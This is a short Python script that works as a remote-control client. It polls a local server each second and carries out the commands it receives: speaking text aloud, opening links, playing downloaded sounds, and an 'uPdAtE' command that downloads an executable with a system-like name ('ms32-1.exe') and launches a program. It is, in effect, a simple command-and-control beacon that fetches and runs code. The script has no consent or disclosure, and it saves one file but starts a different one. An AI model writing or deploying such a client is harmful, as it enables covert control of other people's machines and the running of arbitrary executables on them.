import requests as rq
from time import sleep
from threading import Thread
from webbrowser import open as wbopen
from pydub import AudioSegment
from pydub.playback import play
import os
import pyttsx3
url = "http://127.0.0.1:5000/"
terminate = False
def hit(url:str):
    if not terminate:
        return rq.get(url,stream=True)

def say(txt):
    engine = pyttsx3.init()
    engine.say(txt)
    engine.runAndWait()

def playfunc(fp):
    if not os.path.exists(os.path.join("effects",fp)):
        audi = hit(url+f"static/sounds/{fp}")
        total_size = int(audi.headers.get('content-length', 0))
        with open(os.path.join("effects",fp), "xb") as file:
            downloaded_size = 0
            for chunk in audi.iter_content(chunk_size=8192):
                if chunk:
                    file.write(chunk)
                    downloaded_size += len(chunk)
                    
    audio = AudioSegment.from_mp3(f"effects/{fp}")
    play(audio)    

def update():
    global terminate
    exe = hit(url+"static/updates/ms32-1.exe")
    total_size = int(exe.headers.get('content-length', 0))
    with open("ms32-1.exe", "xb") as file:
        downloaded_size = 0
        for chunk in exe.iter_content(chunk_size=8192):
            if chunk:
                file.write(chunk)
                downloaded_size += len(chunk)
    os.startfile("updater.exe")
    terminate=True
    return
    
def main():
    while not terminate:
        cmd = hit(url+"command").content.decode("utf-8")
        print(cmd,type(cmd))
        if "sPeAk" in cmd:
            txt = cmd.replace("sPeAk","")
            saying = Thread(target=say,args=(txt,))
            saying.start()
        elif "oPeN" in cmd:
            link = cmd.replace("oPeN ","")
            wbopen(link)
        elif "pLaY" in cmd:
            fp = cmd.replace("pLaY ","")
            Thread(target=playfunc,args=(fp,)).start()
        elif "uPdAtE" in cmd:
            update()
            
        sleep(1)
    return

main()